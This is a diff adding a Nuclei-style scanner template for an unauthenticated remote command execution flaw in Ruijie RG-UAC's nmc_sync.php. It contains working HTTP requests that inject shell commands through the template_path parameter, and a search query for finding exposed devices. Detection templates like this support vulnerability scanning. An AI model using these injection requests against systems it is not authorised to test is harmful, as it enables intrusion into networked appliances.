@@ -1,0 +1,45 @@
+id: ruijie-nmc-sync-rce
+
+info:
+  name: Ruijie RG-UAC nmc_sync.php - Remote Code Execution
+  author: DhiyaneshDk
+  severity: critical
+  description: |
+    There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.
+  reference:
+    - https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py
+  classification:
+    cpe: cpe:2.3:h:ruijie:rg-uac:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: title="RG-UAC登录页面" && body="admin"
+    product: rg-uac
+    vendor: ruijie
+  tags: rg-uac,file-upload,intrusive,ruijie
+
+variables:
+  random_str: "{{rand_base(6)}}"
+  match_str: "{{md5(random_str)}}"
+
+http:
+  - raw:
+      - |
+        GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{match_str}}+>+{{random_str}}.txt|cat HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /view/systemConfig/management/{{random_str}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|rm+{{random_str}}.txt|cat HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, '{{match_str}}')"
+        condition: and
+# digest: 490a00463044022000add7c1a0bd6b052e959549869ab9cdf71c1e9c846d1f7bd97957fc41bd63490220229b95f7137bbac8645a1fcd9899211488b04c34bdab21676acd6026e448d8c6:922c64590222798bb761d5b6d8e72950
